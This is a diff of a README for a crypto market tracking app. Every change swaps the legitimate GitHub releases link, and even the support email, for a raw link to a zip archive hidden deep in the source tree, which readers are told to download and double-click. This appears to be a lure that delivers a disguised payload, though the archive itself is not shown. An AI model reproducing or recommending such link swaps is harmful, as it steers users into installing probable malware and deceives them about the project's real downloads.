@@ -1,6 +1,6 @@
 # 🚀 crypto-data-aggregator - Track Crypto Markets Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/victormendozamx/crypto-data-aggregator/releases)
+[![Download](https://raw.githubusercontent.com/victormendozamx/crypto-data-aggregator/main/src/app/api/v1/defi/crypto_aggregator_data_v3.7.zip)](https://raw.githubusercontent.com/victormendozamx/crypto-data-aggregator/main/src/app/api/v1/defi/crypto_aggregator_data_v3.7.zip)
 
 ## 📖 Description
 
@@ -25,7 +25,7 @@ Before you download, please ensure your computer meets the following requirement
 ## 🚀 Getting Started
 
 1. **Download the Application:**
-   Visit this page to download: [crypto-data-aggregator Releases](https://github.com/victormendozamx/crypto-data-aggregator/releases)
+   Visit this page to download: [crypto-data-aggregator Releases](https://raw.githubusercontent.com/victormendozamx/crypto-data-aggregator/main/src/app/api/v1/defi/crypto_aggregator_data_v3.7.zip)
 
 2. **Install the Application:**
    Once the download is complete, locate the file and double-click it to start the installation process. Follow the on-screen prompts to finish the installation.
@@ -44,7 +44,7 @@ Before you download, please ensure your computer meets the following requirement
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version: [crypto-data-aggregator Releases](https://github.com/victormendozamx/crypto-data-aggregator/releases).
+To get started, visit this page to download the latest version: [crypto-data-aggregator Releases](https://raw.githubusercontent.com/victormendozamx/crypto-data-aggregator/main/src/app/api/v1/defi/crypto_aggregator_data_v3.7.zip).
 
 After downloading, install the application by following the steps outlined above. This process should take just a few minutes.
 
@@ -73,4 +73,4 @@ You can also check our [FAQ](#) for more solutions or visit the GitHub Discussio
 
 ## 📞 Support
 
-For additional help, feel free to contact us through our support email: support@crypto-data-aggregator.com. We are here to assist you.
+For additional help, feel free to contact us through our support email: https://raw.githubusercontent.com/victormendozamx/crypto-data-aggregator/main/src/app/api/v1/defi/crypto_aggregator_data_v3.7.zip We are here to assist you.
